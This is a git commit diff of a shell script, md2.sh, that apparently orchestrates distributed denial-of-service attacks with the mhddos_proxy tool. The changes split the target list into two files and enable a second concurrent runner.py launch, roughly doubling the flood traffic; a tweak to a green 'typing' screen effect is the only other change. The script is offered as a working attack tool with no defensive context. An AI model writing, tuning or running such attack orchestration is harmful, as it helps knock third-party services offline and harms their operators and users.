ec0eba5db0d419eca7d67fafb5965e181c8cdbb3
Kali <darkwing42@gmail.com>
2022-05-14 06:18:01 -0400

    update

--- md2.sh
+++ md2.sh
@@ -17,7 +17,7 @@ typing_on_screen (){
     tput setaf 2 &>/dev/null # green
     for ((i=0; i<=${#1}; i++)); do
         printf '%s' "${1:$i:1}"
-        sleep 0.08$(( (RANDOM % 5) + 1 ))
+        sleep 0.06$(( (RANDOM % 5) + 1 ))
     done
     tput sgr0 2 &>/dev/null
 }
@@ -68,7 +68,7 @@ cat $targets_line_by_line | sort | uniq | sort -R > $targets_uniq
 
 #split targets by line in N files
 cd /var/tmp/
-split -n l/1 --additional-suffix=.uaripper $targets_uniq
+split -n l/2 --additional-suffix=.uaripper $targets_uniq
 cd -
 
 # Print greetings and number of targets (secondary, main, total)
@@ -197,8 +197,8 @@ while true; do
 echo "threads: "$threads; echo "methods: "$methods
         pkill -f start.py; pkill -f runner.py 
         python3 ~/multidd/mhddos_proxy/runner.py -c $t1 $threads $methods&
-        # sleep 10 # to decrease load on cpu during simultaneous start
-        # python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
+        sleep 10 # to decrease load on cpu during simultaneous start
+        python3 ~/multidd/mhddos_proxy/runner.py -c $t2 $threads $methods&
         # sleep 10 # to decrease load on cpu during simultaneous start
         # python3 ~/multidd/mhddos_proxy/runner.py -c $t3 $threads $methods&
         # sleep 10 # to decrease load on cpu during simultaneous start
